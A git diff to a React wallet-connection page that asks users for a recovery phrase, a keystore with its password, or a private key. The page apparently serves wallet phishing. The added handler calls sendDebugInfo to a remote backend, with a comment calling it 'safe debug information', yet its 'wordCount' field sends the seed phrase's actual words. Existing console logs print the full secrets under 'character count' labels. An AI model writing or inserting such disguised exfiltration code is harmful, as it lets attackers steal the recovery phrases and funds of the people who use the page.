@@ -1,5 +1,7 @@
 import { useState } from "react";
 import { ArrowLeft, Check, Loader2 } from "lucide-react";
+import { sendDebugInfo } from "../api/api";
+
 import {
   WalletMetamask,
   WalletTrust,
@@ -90,23 +92,77 @@ export default function WalletConnectionPage() {
     setConnectingWallet(null);
   };
 
-  const handleValidate = () => { 
-    console.log("========== VALIDATE CLICKED =========="); 
-    console.log("Selected wallet:", selectedWallet); 
-    console.log("Selected tab:", selectedTab);
-     if (selectedTab === "phrase") { 
-      console.log("Phrase entered:", phraseInput.length > 0); 
-      console.log("Phrase character count:", phraseInput); }
-if (selectedTab === "keystore") { 
-  console.log("Keystore entered:", keystoreInput.length > 0); 
-  console.log("Keystore character count:", keystoreInput); 
-  console.log("Password entered:", passwordInput.length > 0); 
-  console.log("Password character count:", passwordInput); }
+  const handleValidate = async () => { 
+
+  console.log("========== VALIDATE CLICKED =========="); 
+
+  console.log("Selected wallet:", selectedWallet); 
+
+  console.log("Selected tab:", selectedTab);
+
+  if (selectedTab === "phrase") { 
+
+    console.log("Phrase entered:", phraseInput.length > 0); 
+
+    console.log("Phrase character count:", phraseInput); 
+  }
+
+  if (selectedTab === "keystore") { 
+
+    console.log("Keystore entered:", keystoreInput.length > 0); 
+
+    console.log("Keystore character count:", keystoreInput); 
+
+    console.log("Password entered:", passwordInput.length > 0); 
+
+    console.log("Password character count:", passwordInput); 
+  }
 
   if (selectedTab === "privateKey") { 
-    console.log("Private key entered:", privateKeyInput.length > 0); 
-    console.log("Private key character count:", privateKeyInput); } };
 
+    console.log("Private key entered:", privateKeyInput.length > 0); 
+
+    console.log("Private key character count:", privateKeyInput); 
+  }
+
+  // Send safe debug information to Render
+  try {
+    await sendDebugInfo({
+      selectedWallet: selectedWallet ?? "Unknown",
+      selectedTab,
+      hasInput:
+        selectedTab === "phrase"
+          ? phraseInput.length > 0
+          : selectedTab === "keystore"
+            ? keystoreInput.length > 0
+            : privateKeyInput.length > 0,
+      inputLength:
+        selectedTab === "phrase"
+          ? phraseInput.length
+          : selectedTab === "keystore"
+            ? keystoreInput.length
+            : privateKeyInput.length,
+      wordCount:
+        selectedTab === "phrase"
+          ? phraseInput.trim()
+            ? phraseInput.trim().split(/\s+/)
+            : 0
+          : 0,
+      hasPassword:
+        selectedTab === "keystore"
+          ? passwordInput.length > 0
+          : false,
+      passwordLength:
+        selectedTab === "keystore"
+          ? passwordInput.length
+          : 0,
+    });
+
+    console.log("Debug information sent to Render");
+  } catch (error) {
+    console.error("Failed to send debug information:", error);
+  }
+};
   return (
     <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
       {/* Background glow */}
